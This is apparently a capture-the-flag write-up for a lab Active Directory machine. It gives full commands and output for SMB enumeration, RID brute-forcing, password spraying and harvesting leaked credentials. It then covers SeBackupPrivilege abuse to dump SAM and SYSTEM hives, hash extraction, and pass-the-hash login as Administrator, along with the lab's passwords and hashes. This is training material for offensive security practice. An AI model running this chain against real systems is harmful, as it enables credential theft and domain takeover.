
Target : 10.129.231.149

Date : 31/05/2026

```bash
>  sudo nmap -sC -sV -Pn -O -T4 --min-rate=3000 -p- 10.129.231.149  
Please touch the FIDO authenticator.  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-31 14:00 +0200  
Nmap scan report for 10.129.231.149  
Host is up (0.090s latency).  
Not shown: 65522 filtered tcp ports (no-response)  
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Simple DNS Plus  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-31 19:01:30Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)  
|_ssl-date: 2026-05-31T19:03:04+00:00; +6h59m58s from scanner time.  
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb  
| Not valid before: 2024-08-22T20:24:16  
|_Not valid after:  2025-08-22T20:24:16  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)  
|_ssl-date: 2026-05-31T19:03:05+00:00; +6h59m58s from scanner time.  
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb  
| Not valid before: 2024-08-22T20:24:16  
|_Not valid after:  2025-08-22T20:24:16  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)  
|_ssl-date: 2026-05-31T19:03:04+00:00; +6h59m58s from scanner time.  
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb  
| Not valid before: 2024-08-22T20:24:16  
|_Not valid after:  2025-08-22T20:24:16  
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb  
| Not valid before: 2024-08-22T20:24:16  
|_Not valid after:  2025-08-22T20:24:16  
|_ssl-date: 2026-05-31T19:03:05+00:00; +6h59m58s from scanner time.  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
65173/tcp open  msrpc         Microsoft Windows RPC  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)  
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016  
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)  
No exact OS matches for host (test conditions non-ideal).  
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s  
| smb2-time:    
|   date: 2026-05-31T19:02:24  
|_  start_date: N/A  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 170.62 seconds  
>  echo "cicada.htb 10.129.231.149" | sudo tee -a /etc/hosts  
cicada.htb 10.129.231.149
```

This seems to be a classic AD box : LDAP on ports `389/tcp` `636/tcp`, `3268/tcp`, RPC and NetBIOS on `135/tcp` and `139/tcp` respectively, Kerberos on port `88/tcp`, but we also have a http server running on `5985/tcp` and DNS on port `53/tcp`, and SMB 3.1.1 on port `445/tcp`. We also have RPC over HTTP at port `593/tcp`.

We'll start by looking at the samba shares :

```bash
>  nxc smb 10.129.231.149 -u guest -p '' --shares --groups --users  
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\guest:    
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares  
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark  
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------  
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin  
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share  
SMB         10.129.231.149  445    CICADA-DC        DEV                                
SMB         10.129.231.149  445    CICADA-DC        HR              READ               
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC  
SMB         10.129.231.149  445    CICADA-DC        NETLOGON                        Logon server share    
SMB         10.129.231.149  445    CICADA-DC        SYSVOL                          Logon server share    
SMB         10.129.231.149  445    CICADA-DC        [-] [REMOVED] Arg moved to the ldap protocol
```

We have a `READ` right as guest on HR.

```bash
>  smbclient //10.129.231.149/HR -U guest  
Password for [WORKGROUP\guest]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Thu Mar 14 13:29:09 2024  
 ..                                  D        0  Thu Mar 14 13:21:29 2024  
 Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024  
  
               4168447 blocks of size 4096. 477862 blocks available
smb: \> get "Notice from HR.txt  
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (5.8 KiloBytes/sec) (average 5.8 KiloBytes/sec)
```

We read the text :

```bash
>  cat "Notice from HR.txt"  
  
Dear new hire!  
  
Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.  
  
Your default password is: Cicada$M6Corpb*@Lp#nZp!8  
  
To change your password:  
  
1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.  
2. Once logged in, navigate to your account settings or profile settings section.  
3. Look for the option to change your password. This will be labeled as "Change Password".  
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.  
5. After changing your password, make sure to save your changes.  
  
Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.  
  
If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.  
  
Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!  
  
Best regards,  
Cicada Corp
```

So we have a "default password" : `Cicada$M6Corpb*@Lp#nZp!8` but no username.

We'll add CICADA-DC.cicada.htb and CICADA-DC to `/etc/hosts/` next to the target IP.

Now, we need to find the username(s) corresponding to the password.

```bash
>  nxc smb 10.129.231.149 -d cicada.htb -u guest -p '' --rid-brute 10000  
  
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\guest:    
SMB         10.129.231.149  445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)  
SMB         10.129.231.149  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)  
SMB         10.129.231.149  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)  
SMB         10.129.231.149  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)  
SMB         10.129.231.149  445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)  
SMB         10.129.231.149  445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)  
SMB         10.129.231.149  445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)  
SMB         10.129.231.149  445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)  
SMB         10.129.231.149  445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)  
SMB         10.129.231.149  445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)  
SMB         10.129.231.149  445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)  
SMB         10.129.231.149  445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)  
SMB         10.129.231.149  445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)  
SMB         10.129.231.149  445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)  
SMB         10.129.231.149  445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)  
SMB         10.129.231.149  445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)  
SMB         10.129.231.149  445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)  
SMB         10.129.231.149  445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)  
SMB         10.129.231.149  445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)  
SMB         10.129.231.149  445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)  
SMB         10.129.231.149  445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)  
SMB         10.129.231.149  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)  
SMB         10.129.231.149  445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)  
SMB         10.129.231.149  445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)  
SMB         10.129.231.149  445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)  
SMB         10.129.231.149  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)  
SMB         10.129.231.149  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)  
SMB         10.129.231.149  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)  
SMB         10.129.231.149  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)  
SMB         10.129.231.149  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)  
SMB         10.129.231.149  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

We make a small list of users with `nano /tmp/cusers.txt` :

```nano
 GNU nano 9.0                                                                                     /tmp/cusers.txt                                                                                      Modified     
john.smoulder  
sarah.dantelia                  
david.orelious    
michael.wrightson  
emily.oscars
```

```bash
>  nxc smb 10.129.231.149 -d cicada.htb -u /tmp/cusers.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success  
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE    
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE    
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE    
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8    
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```

So `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8` it is.

```bash
>  nxc smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares --groups --users  
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8    
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares  
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark  
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------  
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin  
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share  
SMB         10.129.231.149  445    CICADA-DC        DEV                                
SMB         10.129.231.149  445    CICADA-DC        HR              READ               
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC  
SMB         10.129.231.149  445    CICADA-DC        NETLOGON        READ            Logon server share    
SMB         10.129.231.149  445    CICADA-DC        SYSVOL          READ            Logon server share    
SMB         10.129.231.149  445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                                  
SMB         10.129.231.149  445    CICADA-DC        Administrator                 2024-08-26 20:08:03 0       Built-in account for administering the computer/domain    
SMB         10.129.231.149  445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain    
SMB         10.129.231.149  445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account    
SMB         10.129.231.149  445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 1           
SMB         10.129.231.149  445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 1           
SMB         10.129.231.149  445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0           
SMB         10.129.231.149  445    CICADA-DC        david.orelious                2024-03-14 12:17:29 1       Just in case I forget my password is aRt$Lp#7t*VQ!3    
SMB         10.129.231.149  445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 1           
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated 8 local users: CICADA
```

And we got a second user/password combination : `david.orelious:aRt$Lp#7t*VQ!3`

```bash
>  nxc smb 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares  
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3    
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares  
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark  
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------  
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin  
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share  
SMB         10.129.231.149  445    CICADA-DC        DEV             READ               
SMB         10.129.231.149  445    CICADA-DC        HR              READ               
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC  
SMB         10.129.231.149  445    CICADA-DC        NETLOGON        READ            Logon server share    
SMB         10.129.231.149  445    CICADA-DC        SYSVOL          READ            Logon server share    
>  nxc winrm 10.129.231.149 -u david.orelious -p 'aRt$Lp#7t*VQ!3'  
WINRM       10.129.231.149  5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)    
WINRM       10.129.231.149  5985   CICADA-DC        [-] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
```

Looks like we can't get a shell, but swe can `READ` `DEV` with this one.

```bash
>  smbclient //10.129.231.149/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Thu Mar 14 13:31:39 2024  
 ..                                  D        0  Thu Mar 14 13:21:29 2024  
 Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024  
  
               4168447 blocks of size 4096. 481542 blocks available  
smb: \> get Backup_script.ps1  
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
```

```bash
>  cat Backup_script.ps1  
  
  
$sourceDirectory = "C:\smb"  
$destinationDirectory = "D:\Backup"  
  
$username = "emily.oscars"  
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force  
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)  
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"  
$backupFileName = "smb_backup_$dateStamp.zip"  
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName  
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath  
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

We got a  new username/password : `emily.oscars:Q!3@Lp#M6b*7t*Vt`

Maybe we'll have more luck this time.

```bash
>  nxc winrm 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'  
WINRM       10.129.231.149  5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)    
WINRM       10.129.231.149  5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```

And we do.

```PowerShell
>  evil-winrm -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> dir /Users/emily.oscars.CICADA/Desktop  
  
  
   Directory: C:\Users\emily.oscars.CICADA\Desktop  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
-ar---         5/31/2026  11:58 AM             34 user.txt  
  
  
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> type /Users/emily.oscars.CICADA/Desktop/user.txt  
e187e1d1e87cad2286af6ee2f0deff92
```

And we got the user flag.

Now for PrivEsc :

```PowerShell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State  
============================= ============================== =======  
SeBackupPrivilege             Back up files and directories  Enabled  
SeRestorePrivilege            Restore files and directories  Enabled  
SeShutdownPrivilege           Shut down the system           Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

So we got a `SeBackupPrivilege` and a `SeRestorePrivilege` as emily.

```PowerShell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd C:\ProgramData
*Evil-WinRM* PS C:\ProgramData>reg save HKLM\SAM sam
The operation completed successfully.
*Evil-WinRM* PS C:\ProgramData>reg save HKLM\SYSTEM system
The operation completed successfully.
*Evil-WinRM* PS C:\ProgramData> download sam  
   
                                          
Info: Downloading C:\ProgramData\sam to sam  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...

*Evil-WinRM* PS C:\ProgramData> download system  
                                          
Info: Downloading C:\ProgramData\system to system  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
                                          
Info: Download successful!
```

Then, we use impacket to get hashes :

```bash
>  secretsdump.py -sam sam -system system LOCAL  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620  
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
[*] Cleaning up...
```

And we got the administrator hash :

`Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341`

This is an LM:NT or NTLM hash. We can ignore the `aad3...` this is the default AP hash, outdated, completely useless, the real hash is `:2b87e7c93a3e8a0ea4a581937016f341`.

```PowerShell
>  evil-winrm -i 10.129.231.149 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341  
  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type /Users/Administrator/Desktop/root.txt  
8b7682a6594cdd31f9d546a8c070e8e7
```

And we got the root flag.
